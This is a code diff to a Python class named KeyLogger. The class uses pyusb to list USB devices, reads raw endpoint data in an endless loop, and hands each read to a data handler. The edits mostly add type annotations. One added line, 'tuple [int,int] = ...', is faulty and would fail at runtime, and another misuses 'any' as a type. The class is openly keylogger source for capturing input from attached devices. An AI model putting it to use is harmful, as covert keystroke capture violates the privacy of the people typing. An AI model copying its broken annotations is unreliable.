@@ -8,7 +8,7 @@ class KeyLogger:
     __slots__ = ["__devices", "data_handler"]
 
     def __init__(self, data_handler: DataHandler) -> None:
-        self.__devices = self.get_devices()
+        self.__devices: list = self.get_devices()
         self.data_handler = data_handler
 
     def __del__(self):
@@ -21,7 +21,7 @@ class KeyLogger:
         # Enumerate over all USB devices
         for device in devices:
             try:
-                tuple = device.idVendor, device.idProduct
+                tuple [int,int] = device.idVendor, device.idProduct
                 vendor_ids.append(tuple)
             except usb.core.USBError as e:
                 print(f"Error reading Vendor ID: {e}")
@@ -47,7 +47,7 @@ class KeyLogger:
         try:
             # Endlosschleife zum Abhören des USB-Verkehrs
             while True:
-                data = dev.read(0x81, 64)  # Endpoint-Adresse und Puffergröße anpassen
+                data: any = dev.read(0x81, 64)  # Endpoint-Adresse und Puffergröße anpassen
                 # Hier können Sie mit den USB-Daten weiterarbeiten
                 self.data_handler.write(data)
         except KeyboardInterrupt:
@@ -55,8 +55,3 @@ class KeyLogger:
         finally:
             usb.util.release_interface(dev, 0)
             dev.reset()
-
-
-# if __name__ == "__main__":
-#     key_logger = KeyLogger()
-#     key_logger.run()
